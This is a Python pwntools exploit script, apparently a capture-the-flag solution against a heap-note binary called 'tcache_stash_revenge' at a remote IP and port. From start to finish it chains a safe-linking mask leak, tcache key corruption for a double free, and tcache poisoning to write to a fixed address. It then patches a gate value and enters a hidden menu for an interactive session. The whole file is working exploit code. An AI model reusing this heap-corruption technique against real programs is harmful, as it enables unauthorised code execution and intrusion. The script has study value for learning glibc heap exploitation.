#!/usr/bin/env python3
from pwn import *


HOST = "34.62.69.250"
PORT = 41052
TARGET = 0x4CBAC0
BIN_SZ = 0x40

context.binary = ELF("./tcache_stash_revenge", checksec=False)
context.terminal = ["bash", "-lc"]


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.LOCAL:
        return process(["./run.sh"])
    return process([context.binary.path])


def recv_menu(io):
    return io.recvuntil(b"> ")


def choose(io, value):
    io.sendline(str(value).encode())


def create(io, size, data):
    choose(io, 1)
    io.sendlineafter(b"size:\n", str(size).encode())
    io.sendafter(b"data:\n", data)
    return recv_menu(io)


def edit(io, idx, size, data):
    choose(io, 2)
    io.sendlineafter(b"idx:\n", str(idx).encode())
    io.sendlineafter(b"size:\n", str(size).encode())
    io.sendafter(b"data:\n", data)
    return recv_menu(io)


def delete(io, idx):
    choose(io, 3)
    io.sendlineafter(b"idx:\n", str(idx).encode())
    return recv_menu(io)


def show(io, idx, size):
    choose(io, 4)
    io.sendlineafter(b"idx:\n", str(idx).encode())
    blob = recv_menu(io)
    # show prints "data:\n", then raw bytes, then a trailing newline and the menu.
    return blob[6 : 6 + size]


def exploit(io):
    recv_menu(io)

    # Two same-sized notes let us keep one legitimate entry in the tcache bin.
    create(io, BIN_SZ, b"A" * BIN_SZ)  # slot 0: A
    create(io, BIN_SZ, b"B" * BIN_SZ)  # slot 1: B

    # First free leaks the safe-linking mask from encoded NULL.
    delete(io, 0)
    leak = show(io, 0, BIN_SZ)
    mask = u64(leak[:8])
    log.info(f"safe-link mask = {mask:#x}")

    # Corrupt the freed chunk's tcache key so the second free is accepted.
    edit(io, 0, 0x10, b"K" * 8 + p64(0))
    delete(io, 0)

    # Allocate the same chunk twice via tcache dup.
    create(io, BIN_SZ, b"C" * BIN_SZ)  # slot 2: A
    create(io, BIN_SZ, b"D" * BIN_SZ)  # slot 3: A alias

    # Keep count > 0 after the poisoned pop so the fake head is actually used.
    delete(io, 1)  # free B
    delete(io, 2)  # free A, now head=A and next=B

    # Poison A->next through the alias that still points to the freed chunk.
    edit(io, 3, 0x10, p64(mask ^ TARGET) + p64(0))

    # First create pops A and sets the tcache head to TARGET with count still 1.
    create(io, BIN_SZ, b"E" * BIN_SZ)

    # Second create returns TARGET, so the note data write patches the gate.
    create(io, BIN_SZ, p64(0x1337).ljust(BIN_SZ, b"F"))

    # Hidden menu path.
    choose(io, 1337)


def main():
    io = start()
    exploit(io)
    io.interactive()


if __name__ == "__main__":
    main()
